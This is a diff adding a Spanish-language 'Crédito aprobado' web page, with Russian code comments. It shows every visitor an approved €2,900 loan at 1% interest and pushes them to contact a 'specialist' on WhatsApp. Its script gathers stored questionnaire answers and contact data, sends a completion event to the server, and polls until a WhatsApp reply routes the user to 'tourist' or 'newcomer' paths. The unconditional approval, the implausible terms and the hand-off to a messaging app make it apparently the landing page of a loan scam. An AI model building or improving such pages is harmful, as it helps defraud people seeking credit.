@@ -1,0 +1,250 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Crédito aprobado</title>
+    <script src="./js/app-guard.js?v=20260518-1"></script>
+    <script src="./js/flow-guard.js?v=20260527-1"></script>
+    <script src="./js/api-config.js?v=20260321-6"></script>
+    <script src="./js/flow-session-id.js?v=20260320-3"></script>
+    <script src="./js/flow-events.js?v=20260518-1"></script>
+    <link rel="stylesheet" href="./CSS/link-bank.css" />
+    <link rel="stylesheet" href="./CSS/card-component.css" />
+    <style>
+      .footer__btn:active { opacity: 0.9; }
+    </style>
+  </head>
+
+  <body>
+    <div class="final-shell">
+    <div class="header">
+      <div class="user">
+        <img src="./assets/profile.png" alt="" class="user__img" />
+        <div class="user__text">
+          <h1 class="user__text-title" id="headerName">Steve Young</h1>
+          <p class="user__text-desc" id="headerEmail">steve.young@gmail.com</p>
+        </div>
+      </div>
+      <img src="./assets/Notification.png" alt="" class="header__notification" id="headerBell" />
+    </div>
+
+    <div class="main">
+      <div class="link-bank">
+        <div class="link-bank__header">
+          <h2 class="link-bank__title">Escríbenos por WhatsApp</h2>
+          <p class="link-bank__desc">Nuestro especialista ya está listo para ayudarte.</p>
+        </div>
+
+        <div class="link-bank__image">
+          <div class="card-component">
+            <div class="card-background-wrapper">
+              <img src="./assets/link-bg.png" alt="" class="card-background" />
+              <div class="card-overlay"></div>
+            </div>
+
+            <img src="./assets/link-women.png" alt="" class="card-woman" />
+
+            <div class="card-content">
+              <div class="card-badge">
+                <span class="card-badge-text">En línea</span>
+              </div>
+
+              <div class="card-text-content">
+                <div class="card-text-wrapper">
+                  <h2 class="card-title">Crédito aprobado</h2>
+                  <p class="card-subtitle">Tu solicitud ya fue revisada</p>
+                </div>
+              </div>
+
+              <div class="card-price">
+                <span class="currency">€</span><span id="cardAmount">2900.00</span>
+                <span class="year">/ 1.0%</span>
+              </div>
+
+              <div class="card-list" id="cardFeatures">
+                <div class="card-list-item">
+                  <img src="./assets/icons/tick-circle.svg" alt="" />
+                  <span class="card-list-text" id="featureMonto">Monto: €2900.00</span>
+                </div>
+                <div class="card-list-item">
+                  <img src="./assets/icons/tick-circle.svg" alt="" />
+                  <span class="card-list-text">Tasa de interés: 1.0 %</span>
+                </div>
+                <div class="card-list-item">
+                  <img src="./assets/icons/tick-circle.svg" alt="" />
+                  <span class="card-list-text">Sin papeleo complicado</span>
+                </div>
+                <div class="card-list-item">
+                  <img src="./assets/icons/tick-circle.svg" alt="" />
+                  <span class="card-list-text">Proceso rápido y sencillo</span>
+                </div>
+                <div class="card-list-item">
+                  <img src="./assets/icons/tick-circle.svg" alt="" />
+                  <span class="card-list-text">Plazo flexible: hasta 96 meses</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="link-bank__note">
+          <p class="link-bank__note-title">Comentario</p>
+          <p class="link-bank__note-text">
+            Para poder preparar una solución personalizada para tu solicitud, por favor contáctanos por WhatsApp.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <div class="bottom-bg"></div>
+
+    <div class="btn">
+      <button class="footer__btn" id="whatsappBtn">Escribir en WhatsApp</button>
+    </div>
+    </div>
+
+    <script>
+      (function () {
+        var email = localStorage.getItem("inputName") || "";
+        var phone = localStorage.getItem("inputPhone") || "";
+
+        // Отправляем данные опроса только один раз — используем localStorage
+        // (sessionStorage сбрасывается при закрытии вкладки).
+        try {
+          if (!localStorage.getItem("flowCompletedSent")) {
+            localStorage.setItem("flowCompletedSent", "1");
+            var answers = {};
+            try {
+              var step2 = localStorage.getItem("comprehensiveStep2");
+              if (step2) answers = JSON.parse(step2) || {};
+            } catch (_) {}
+            if (window.FlowEvents) {
+              FlowEvents.flowCompleted(answers);
+            }
+          }
+        } catch (_) {}
+
+        var nombre = "";
+        try {
+          var step2Raw = localStorage.getItem("comprehensiveStep2");
+          if (step2Raw) {
+            var step2Data = JSON.parse(step2Raw) || {};
+            nombre = step2Data["nombre"] || step2Data["Nombre"] || "";
+          }
+        } catch (_) {}
+
+        var nameEl = document.getElementById("headerName");
+        var emailEl = document.getElementById("headerEmail");
+        function trunc(s) { return s.length > 23 ? s.slice(0, 23) + "..." : s; }
+        if (nameEl) nameEl.textContent = trunc(nombre || email || "Steve Young");
+        if (emailEl) emailEl.textContent = trunc(email || "steve.young@gmail.com");
+
+        var amount = localStorage.getItem("selectedCreditAmount") || null;
+        if (!amount) {
+          try {
+            var raw = localStorage.getItem("questionnaireFlowState");
+            if (raw) {
+              var state = JSON.parse(raw);
+              amount = state.selectedAmount || state.amount || state.importe || null;
+            }
+          } catch (_) {}
+        }
+
+        if (amount) {
+          var n = Number(amount);
+          var amEl = document.getElementById("cardAmount");
+          if (amEl) amEl.textContent = n.toLocaleString("es-ES", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+          var montoEl = document.getElementById("featureMonto");
+          if (montoEl) montoEl.textContent = "Monto: €" + n.toLocaleString("es-ES", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+
+        var bell = document.getElementById("headerBell");
+        if (bell) bell.style.cursor = "default";
+
+        // ───── Логика редиректа по роли ─────
+        var apiBase = window.API_BASE || window.location.origin;
+        var pollTimer = null;
+        var POLL_INTERVAL = 2000;
+        var alreadyRedirected = false;
+        var instantRedirect = false;
+
+        // Загружаем настройку мгновенного редиректа с сервера
+        fetch(apiBase + "/api/settings")
+          .then(function (r) { return r.json(); })
+          .then(function (s) {
+            if (s && s.instantRedirect === true) {
+              instantRedirect = true;
+            }
+          })
+          .catch(function () {});
+
+        function redirectByRole(role) {
+          if (alreadyRedirected) return;
+          alreadyRedirected = true;
+          try { localStorage.setItem("userRole", role); } catch (_) {}
+          if (role === "tourist") {
+            window.location.replace("./tourist/");
+          } else if (role === "newcomer") {
+            window.location.replace("./newcomer/");
+          }
+        }
+
+        function fetchRoleStatus() {
+          if (!email) return Promise.resolve(null);
+          return fetch(apiBase + "/api/user-role?email=" + encodeURIComponent(email))
+            .then(function (r) { return r.json(); })
+            .then(function (data) { return data || null; })
+            .catch(function () { return null; });
+        }
+
+        function startPolling() {
+          if (pollTimer) return;
+          pollTimer = setInterval(function () {
+            fetchRoleStatus().then(function (data) {
+              if (data && data.role && data.whatsappReplied === true) {
+                clearInterval(pollTimer);
+                pollTimer = null;
+                redirectByRole(data.role);
+              }
+            });
+          }, POLL_INTERVAL);
+        }
+
+        // Если уже отправляли сообщение с ID — сразу запускаем polling (не открываем WA снова)
+        if (localStorage.getItem("waMsgSent") === "1") {
+          startPolling();
+        }
+
+        // Кнопка WhatsApp
+        var waBtn = document.getElementById("whatsappBtn");
+        if (waBtn) {
+          waBtn.addEventListener("click", function () {
+            var base = window.WHATSAPP_BASE_URL || "";
+            if (!base) { alert("WhatsApp URL no configurado."); return; }
+
+            var sessionId = (typeof window.getFlowSessionId === "function")
+              ? window.getFlowSessionId()
+              : (localStorage.getItem("flowSessionId") || "");
+
+            var msg = "¡Hola! Quiero confirmar mi solicitud.";
+            if (sessionId) msg += " Mi código: " + sessionId;
+
+            window.open(base + encodeURIComponent(msg), "_blank");
+            localStorage.setItem("waMsgSent", "1");
+
+            if (instantRedirect) {
+              // Мгновенный режим: берём роль определённую во время капчи, редиректим сразу
+              fetchRoleStatus().then(function (data) {
+                if (data && data.role) redirectByRole(data.role);
+              }).catch(function () {});
+            } else {
+              // Стандартный режим: ждём ответа от WhatsApp
+              startPolling();
+            }
+          });
+        }
+      })();
+    </script>
+  </body>
+</html>
